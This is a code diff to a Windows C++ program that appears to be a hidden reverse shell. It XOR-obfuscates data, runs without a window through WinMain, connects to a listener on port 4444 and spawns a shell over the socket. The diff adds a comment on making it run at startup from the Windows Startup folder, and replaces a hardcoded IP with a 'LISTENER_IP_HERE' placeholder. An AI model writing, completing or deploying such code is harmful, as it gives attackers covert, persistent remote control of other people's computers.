@@ -1,3 +1,6 @@
+// C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+// If you wish for this to run on startup, place a shortcut to it in the above directory
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -6,7 +9,7 @@
 #include <array>
 
 #pragma comment(lib, "Ws2_32.lib")
-#pragma warning(disable: 28251) // Ignore certain warning about HANDLEs in std::array
+#pragma warning(disable: 28251) // Ignore warning about annotations in WinMain
 
 void xor_buffer(char* buffer, int size, char key = 0x5A) 
 {
@@ -140,7 +143,7 @@ void SpawnShell(SOCKET sockt)
     CloseHandle(hStdInWrite);
 }
 
-// Entry point for the executable (uses WinMain for GUI-less execution)
+// Entry point for the executable
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
     // Disable error dialogs
@@ -169,7 +172,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         sockaddr_in addr = {};
         addr.sin_family = AF_INET;
         addr.sin_port = htons(4444);                        // Target port
-        inet_pton(AF_INET, "172.20.10.10", &addr.sin_addr); // Target IP
+        inet_pton(AF_INET, "LISTENER_IP_HERE", &addr.sin_addr); // Target IP
 
         // Try to connect
         if (connect(sockt, (sockaddr*)&addr, sizeof(addr)) == 0)
